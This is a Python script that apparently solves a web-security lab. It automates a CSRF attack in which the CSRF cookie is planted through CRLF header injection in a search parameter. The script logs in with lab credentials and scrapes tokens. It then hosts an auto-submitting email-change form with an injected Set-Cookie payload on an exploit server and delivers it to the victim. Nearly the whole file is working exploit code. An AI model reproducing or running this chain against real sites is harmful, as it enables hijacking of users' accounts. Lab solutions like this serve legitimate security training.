import re
import sys
import requests
import string
import urllib.parse

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
my_acc = burp_url + '/my-account'


session = requests.Session()
response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

response = session.get(login_url)
csrf_token_match = re.search(r'<input required type=hidden name=csrf value=([^"]+)', response.text)
csrf = csrf_token_match.group(1)


burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)
csrf_cookie = session.cookies.get('csrfKey')

response = session.get(my_acc)
csrf_token_match = re.search(r'<input required type=hidden name=csrf value=([^"]+)', response.text)
csrf = csrf_token_match.group(1)

#csrf_cookie = session.cookies.get('csrfKey')

burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<html>\r\n  <body>\r\n    <script>history.pushState('', '', '/');</script>\r\n    <form action=\"{burp_url}/my-account/change-email\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"email\" value=\"a&#64;a&#46;com\" />\r\n      <input type=hidden name=csrf value={csrf} />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n\r\n<img src=\"{burp_url}/?search=test%0d%0aSet-Cookie:%20csrfKey={csrf_cookie}%3b%20SameSite=None\"  onerror=\"document.forms[0].submit()\">\r\n    \r\n  </body>\r\n</html>", "formAction": "STORE"}
#burp_data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8", "responseBody": f"<img src=\"{burp_url}/?search=test%0d%0aSet-Cookie:%20csrfKey={csrf}%3b%20SameSite=None\" onerror=\"document.forms[0].submit()\">\r\n", "formAction": "STORE"}
session.post(exploit_server, data=burp_data)

session.get(exploit_server+ '/deliver-to-victim')
